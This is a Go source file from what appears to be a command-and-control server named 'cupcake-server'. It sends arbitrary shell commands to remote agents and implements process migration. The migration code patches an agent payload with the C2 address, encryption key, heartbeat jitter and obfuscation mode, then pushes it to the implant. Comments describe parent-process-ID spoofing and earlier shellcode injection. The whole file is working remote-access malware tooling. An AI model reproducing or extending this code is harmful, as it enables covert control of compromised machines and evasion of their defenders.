package services

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/store"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// SendCommand sends a shell command to the agent
func SendCommand(uuid string, command string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	// OpSec: 精确过滤 UI 发送的 ping 心跳包（仅匹配 JSON 格式的 {"type":"ping"}）
	if command == `{"type":"ping"}` || command == "ping" {
		return nil
	}

	reqID := fmt.Sprintf("CMD-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "shell",
			CommandContent: command,
			ReqID:          reqID,
		},
	}

	// [LOGGING] Record command to DB
	_ = store.CreateCommandLog(uuid, reqID, "shell", command)

	return WriteEncryptedMessage(client, msg)
}

// MigrateToMemory handles the migration logic (Proper implementation from old main.go)
func MigrateToMemory(uuid string, targetProcess string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok { return fmt.Errorf("agent offline") }
	client := val.(*globals.Client)

	var raw []byte
	var err error
	
	searchArch := client.Arch
	if client.OS == "windows" {
		if client.Arch == "x86_64" || client.Arch == "amd64" { searchArch = "windows_amd64" }
	} else if client.OS == "linux" {
		if client.Arch == "x86_64" || client.Arch == "amd64" { searchArch = "linux_amd64" }
	}

	// Search for latest built artifact for this architecture
	matches, _ := filepath.Glob(filepath.Join("storage/payloads", fmt.Sprintf("agent_%s_*", searchArch)))
	if len(matches) > 0 {
		var bestMatch string
		var bestTime time.Time
		for _, m := range matches {
			if info, err := os.Stat(m); err == nil {
				if info.ModTime().After(bestTime) {
					bestTime = info.ModTime()
					bestMatch = m
				}
			}
		}
		if bestMatch != "" {
			raw, _ = os.ReadFile(bestMatch)
			log.Printf("[Migration] Found latest artifact for %s: %s", searchArch, bestMatch)
		}
	}

	// Fallback to templates if no built artifacts found
	if len(raw) == 0 {
		templatePath := "assets/client_template_windows.exe"
		if client.OS == "linux" {
			templatePath = "assets/client_template_linux"
		}
		raw, err = os.ReadFile(templatePath)
		if err != nil {
			log.Printf("[Migration] Error reading fallback template: %v", err)
			return fmt.Errorf("no suitable migration source found")
		}
	}

	// Patch Config for migration
	aesKey := store.GetSetting("system_aes_key")
	if client.EncryptKey != "" { aesKey = client.EncryptKey }
	
	// Determine C2 URL for the new process
	c2url := ""
	if val, ok := globals.Listeners.Load(client.ListenerID); ok {
		ln := val.(*globals.Listener)
		host := ln.PublicHost
		if host == "" { host = ln.BindIP }
		if host == "0.0.0.0" || host == "" {
			host = store.GetSetting("system_c2_host")
			if host == "" { 
				host = "127.0.0.1" 
				// Smart fallback: try to use the Local IP the agent used to connect to us
				if client.TCPConn != nil {
					if localAddr, ok := client.TCPConn.LocalAddr().(*net.TCPAddr); ok {
						if !localAddr.IP.IsUnspecified() {
							host = localAddr.IP.String()
						}
					}
				}
			}
		}

		switch strings.ToUpper(ln.Protocol) {
		case "WS", "WEBSOCKET":
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		case "TCP":
			c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
		case "DNS":
			c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
		case "BIND-TCP", "正向TCP":
			c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
		default:
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		}
		log.Printf("[Migration] Using source listener %s URL: %s", ln.ID, c2url)
	}

	if c2url == "" {
		globals.Listeners.Range(func(k, v interface{}) bool {
			ln := v.(*globals.Listener)
			if ln.Status == "Running" {
				host := ln.PublicHost
				if host == "" { host = ln.BindIP }
				if host == "0.0.0.0" || host == "" { host = "127.0.0.1" }

				switch strings.ToUpper(ln.Protocol) {
				case "WS", "WEBSOCKET":
					c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
					return false
				case "TCP":
					c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
					return false
				case "DNS":
					c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
					return false
				case "BIND-TCP", "正向TCP":
					c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
					return false
				}
			}
			return true
		})
	}
	if c2url == "" {
		c2url = "ws://127.0.0.1:8081/ws"
	}

	heartbeat := 10
	salt := client.EncryptionSalt
	obf := client.ObfuscateMode
	jitter := 30
	if val, ok := globals.Listeners.Load(client.ListenerID); ok {
		ln := val.(*globals.Listener)
		if salt == "" { salt = ln.EncryptionSalt }
		if obf == "" { obf = ln.ObfuscateMode }
		jitter = ln.HeartbeatJitter
		heartbeat = ln.HeartbeatInterval
	}

	patched, err := PatchPayload(raw, c2url, aesKey, heartbeat, jitter, "", false, 0, salt, obf)
	if err != nil {
		return fmt.Errorf("failed to patch migration template: %v", err)
	}

	// --- 🚀 MIGRATION STRATEGY ---
	// Send raw PE EXE directly. The client detects the MZ header and uses
	// spawn-from-disk (WriteFile + CreateProcess with PPID spoofing).
	// This is 100% reliable because the new process is fully initialized by
	// the Windows OS loader with correct CRT, TLS, and stack cookies.
	// (Donut shellcode conversion was removed due to Donut's incomplete
	// CRT/TLS initialization causing BEX64 crashes in injected contexts.)
	finalPayload := patched
	log.Printf("[Migration] Sending raw PE payload (%d bytes) - client will spawn from disk", len(finalPayload))

	reqID := fmt.Sprintf("MIG-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "migrate",
			CommandContent: targetProcess,
			Data:           base64.StdEncoding.EncodeToString(finalPayload),
			ReqID:          reqID,
		},
	}

	if err := WriteEncryptedMessage(client, msg); err != nil { return err }

	// [LOGGING] Record migration to DB
	_ = store.CreateCommandLog(uuid, reqID, "migrate", fmt.Sprintf("Target: %s", targetProcess))
	
	// Wait for response asynchronously or handled by GetResponse/WebSocket
	log.Printf("[Migration] Sent memory payload for agent %s", uuid)
	return nil
}
